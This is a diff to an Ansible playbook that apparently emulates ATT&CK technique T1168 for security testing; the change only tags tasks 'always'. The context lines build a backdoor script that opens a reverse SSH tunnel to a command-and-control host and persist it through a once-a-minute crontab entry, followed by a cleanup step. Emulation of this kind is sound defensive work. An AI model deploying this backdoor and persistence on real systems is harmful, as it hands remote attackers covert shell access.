@@ -7,8 +7,10 @@
    - /opt/ansible/vars.yaml
   tasks:
           - name: createfile
+            tags: always
             file: path={{ backdoor_script }} state=touch
           - name: createscript
+            tags: always
             shell: |
                 echo "sleep 5" >> {{ backdoor_script }}
                 echo "REMLIS={{ cnc_port }}" >> {{ backdoor_script }}
@@ -17,6 +19,7 @@
                 echo "ssh -R \${REMLIS}:localhost:22 -N \${HOSTS} -l \${REMUSER}" >> {{ backdoor_script }}
                 chmod 755 {{ backdoor_script }}
           - name: crontab
+            tags: always
             shell: |
                 crontab -l > /tmp/crontmp
                 echo "* * * * * {{ backdoor_script }}" > {{ crontab_task }} && crontab {{ crontab_task }}
@@ -39,6 +42,7 @@
             debug: msg="Playbook Completed#T1168#passed#linux#"
             when: 'backdoor_script in T1168.stdout'
           - name: cleanup
+            tags: always
             shell: |
               crontab -l < /tmp/crontmp
               rm {{ backdoor_script }}
